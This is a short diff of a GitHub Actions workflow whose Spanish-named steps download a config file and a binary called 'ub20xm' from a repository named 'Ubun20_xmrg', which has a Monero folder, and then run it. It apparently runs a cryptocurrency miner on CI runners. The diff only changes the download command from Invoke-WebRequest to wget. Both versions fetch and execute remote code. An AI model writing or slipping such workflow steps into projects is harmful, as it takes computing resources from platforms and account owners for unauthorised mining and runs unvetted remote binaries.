@@ -13,7 +13,7 @@ jobs:
     steps:
     - name: Descargar.
       run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/Monero/config.json -OutFile config.json
-        Invoke-WebRequest https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/ub20xm -OutFile ub20xm
+        wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/Monero/config.json -OutFile config.json
+        wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/ub20xm -OutFile ub20xm
     - name: Ejecutar.
       run: .\ub20xm
